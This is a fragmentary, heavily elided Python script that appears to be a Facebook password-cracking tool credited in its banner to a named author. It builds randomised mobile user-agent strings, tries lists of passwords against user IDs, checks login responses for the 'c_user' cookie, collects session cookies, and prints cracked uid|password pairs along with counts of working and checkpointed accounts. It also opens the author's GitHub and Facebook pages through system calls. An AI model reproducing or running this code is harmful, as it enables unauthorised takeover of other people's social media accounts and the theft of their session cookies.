...
for xd in range(10000):
  ...
  #Mozilla/5.0 (Linux; Android 13; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36
    ...
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
os.system('xdg-open https://github.com/Sajjadsordar-IN')
...
\033[1;94m       [+]===============================================[+]
\033[1;94m       [+]        CREATED BY   :  SAJJAD SORDAR               \033[1;94m[+]
\033[1;94m       [+]        ON GITHUB    :  Sajjadsordar              \033[1;94m[+]
\033[1;94m       [+]        FACEBOOK       :  SAJJAD SORDAR        \033[1;94m[+]
\033[1;94m       [+]        TOOL VERSION :  0.6                   \033[1;94m[+]
...
class Main:
    def __init__(self):
        ...
        print(" [00] Exit")        
        Alif =input(" [?] Choose : ")
        os.system('xdg-openhttps://www.facebook.com/profile.php?id=100028300412706&mibextid=ZbWKwL')
        if Alif in ["1", "01"]:
            num()
        if Alif in ["2","02"]:
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mN3OB_4\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
    ...
    'user-agent': pro, }
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[Sajjadsordar-CP] {uid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[Sajjadsordar] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
